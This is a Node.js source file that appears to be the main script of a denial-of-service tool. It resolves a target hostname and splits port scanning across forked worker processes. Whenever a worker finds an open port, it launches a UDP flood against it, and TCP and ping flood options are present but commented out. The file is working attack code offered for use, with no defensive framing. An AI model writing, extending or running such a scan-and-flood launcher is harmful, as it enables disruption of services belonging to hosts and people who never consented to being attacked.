const cluster = require('cluster');
const Confirm = require('prompt-confirm');
const udpFlood = require('./services/UdpFloodService');
const pingFlood = require('./services/PingFloodService');
const isopen = require("isopen");
const findStartAndEndPorts = require('./services/WorkersService');
const portScanner = require('portscanner');
const program = require('commander');
const programHelp = require('./services/ProgramHelpService')(program);
// const tcpFlood = require('./services/TcpFloodService');
const resolveHostname = require('./services/DnsResolver');
const scanPortsForIp = require('./services/EvilPortScanner');
const http = require('http');
const numCPUs = require('os').cpus().length;
const cpuFactor = (numCPUs / 4);//Use 1 in production
// const tcpPortUsed = require('tcp-port-used');
const options = {
    target: '127.0.0.1',
    port: '21-23',
    status: 'TROU',
    banner: true
};
const question = new Confirm('CAUTION: You are running flood without any timeout to stop, you can define a timeout with --timeout. Continue? [Y/N] ');
const host = program.host || 'localhost';
const type = program.type || 'UDP';
const port = program.port || 3000;
const timeout = program.timeout || 10000;

// tcpPortUsed.check(3000, '127.0.0.1')
//     .then(function (inUse) {
//         console.log('Discovered port 3000 usage: ' + inUse + ' pid: ' + process.pid);
//     }, function (err) {
//         console.error('Error on check:', err.message);
//     });

if (host) {
    if (cluster.isMaster) {
        let resolvedIpsEnvVar = {};
        console.log("Master " + process.pid + " is running");
        resolveHostname(host)
            .then((ips) => {
                resolvedIpsEnvVar["IPS"] = ips.map((ip) => {
                    return ip.address
                }).toString();
                console.log("Found ips for " + host + ": " + JSON.stringify(ips));
                for (let i = 0; i < cpuFactor; i++) { //TODO change me to use all cores
                    resolvedIpsEnvVar["WORKER_ID"] = i + 1;
                    cluster.fork(resolvedIpsEnvVar);
                }
                cluster.on('exit', function (worker, code, signal) {
                    console.log("EXITING: worker " + worker.process.pid + " died code:" + code + " signal: " + signal);
                });
            }).catch(function (error) {
            throw error;
        });
    } else {
        // Worker 3700 started
        // *** Worker 3700 starting on 127.0.0.1 using range: (0, 8191) ***
        // Worker 20664 started
        // *** Worker 20664 starting on 127.0.0.1 using range: (8191, 16382) ***
        console.log("Worker " + process.pid + " started");
        let ports = [];
        const ips = process.env['IPS'].split(',');
        const workerId = process.env['WORKER_ID'];
        for (let i = 0; i < ips.length; i++) {
            const ip = ips[i];
            let [start, end] = findStartAndEndPorts(workerId, numCPUs);
            if (workerId === '1') {
                start = 0;
                end = 2999;
            } else if (workerId === '2') {
                start = 3000;
                end = 5999;
            }
            console.log(`*** Worker ${process.pid} starting on ${ip} using range: (${start}, ${end}) ***`);
            for (start; start <= end; start++) {
                const scannedPort = start;

                function checkIfOpenPort(start) {
                    isopen(ip, start, function (response, error) {
                        if (error) {
                            throw error
                        }
                        if (response[scannedPort].isOpen) {
                            switch (type) {
                                case 'TCP':
                                    console.log('flooding');
                                    //     tcpFlood(ip, port, timeout, process.pid);
                                    break;
                                case 'UDP':
                                    console.log(`Worker ${process.pid} is flooding ${ip} using open port: ${scannedPort}`);
                                    udpFlood(ip, port, timeout, process.pid);
                                    break;
                                case 'PING':
                                    // pingFlood(ip, port, timeout, process.pid);
                                    console.log('flooding');
                                    break;
                                default:
                                    // udpFlood(ip, port, timeout, process.pid);
                                    console.log('flooding');
                            }
                        } else {
                            if (scannedPort === 3000 || scannedPort === 135 || scannedPort === 445) {
                                console.log(`Worker ${process.pid} at ${ip} found a closed port: ${scannedPort}`)
                            }
                            // console.log(`Worker ${process.pid} at ${ip} found a closed port: ${scannedPort}`)
                        }
                    })
                }

                setTimeout(checkIfOpenPort, 1000, start);
            }
            console.log('looping')
        }
    }
} else {
    programHelp.help();
}
